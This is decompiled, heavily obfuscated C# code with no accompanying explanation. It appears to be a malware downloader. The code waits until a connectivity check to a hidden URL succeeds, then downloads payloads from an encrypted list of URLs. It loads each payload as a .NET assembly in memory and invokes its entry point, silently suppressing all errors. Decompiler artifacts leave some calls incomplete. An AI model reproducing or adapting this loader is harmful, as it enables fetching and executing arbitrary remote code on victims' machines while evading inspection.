using System;
using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Threading;

public static class HaZUS
{
	public static List<string> HaZUSHaZUS = new List<string>(new string[1] { _003CModule_003E.HaZUT(31835, (int)((nint)Type.EmptyTypes.LongLength + 32770), 253) });

	public unsafe static void HaZUS()
	{
		int num = 201;
		while (!HaZUu())
		{
			((delegate*<int, void>)global::HaZUT.HaZUSHaZUS[num - 201])(5000);
		}
		object obj = HaZUSHaZUS.ToArray();
		int num2 = 0;
		while (true)
		{
			int num3 = num2;
			num = (num & -193) | 0x116;
			if (num3 < ((Array)obj).Length)
			{
				object string_ = ((object[])obj)[num2];
				try
				{
					HaZUT((string)string_);
					((delegate*<int, void>)global::HaZUT.HaZUSHaZUS[num - 287])(2500);
				}
				catch
				{
				}
				num2++;
				continue;
			}
			break;
		}
	}

	public unsafe static bool HaZUu()
	{
		string text = _003CModule_003E.HaZUT(21577, 22501, sizeof(short) + 158);
		object obj = ((delegate*<string, WebRequest>)global::HaZUT.HaZUSHaZUS[1])(text);
		try
		{
			((WebRequest)obj).GetResponse();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static void HaZUT(string string_0)
	{
		int num = 181;
		object obj = new WebClient();
		try
		{
			num -= 123;
			object obj2 = (object)/*calli with instance method signature not supportd*/;
			object obj3 = new Thread(HaZUr);
			/*calli with instance method signature not supportd*/;
		}
		catch
		{
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	public unsafe static void HaZUr(object object_0)
	{
		try
		{
			object obj = ((delegate*<AppDomain>)global::HaZUT.HaZUSHaZUS[4])().Load((byte[])object_0);
			object obj2 = HaZUs((Assembly)obj);
			object object_ = ((Assembly)obj).CreateInstance(((MemberInfo)obj2).Name);
			object object_2 = new object[1];
			if (((MethodBase)obj2).GetParameters().Length == 0)
			{
				object_2 = null;
			}
			HaZUQ((MethodInfo)obj2, object_, (object[])object_2);
		}
		catch
		{
		}
	}

	public unsafe static object HaZUQ(MethodInfo methodInfo_0, object object_0, object[] object_1)
	{
		if (((delegate*<MethodInfo, MethodInfo, bool>)global::HaZUT.HaZUSHaZUS[5])(methodInfo_0, null))
		{
			return methodInfo_0.Invoke(object_0, object_1);
		}
		return false;
	}

	public unsafe static MethodInfo HaZUs(Assembly assembly_0)
	{
		if (((delegate*<Assembly, Assembly, bool>)global::HaZUT.HaZUSHaZUS[6])(assembly_0, null))
		{
			return assembly_0.EntryPoint;
		}
		return null;
	}
}
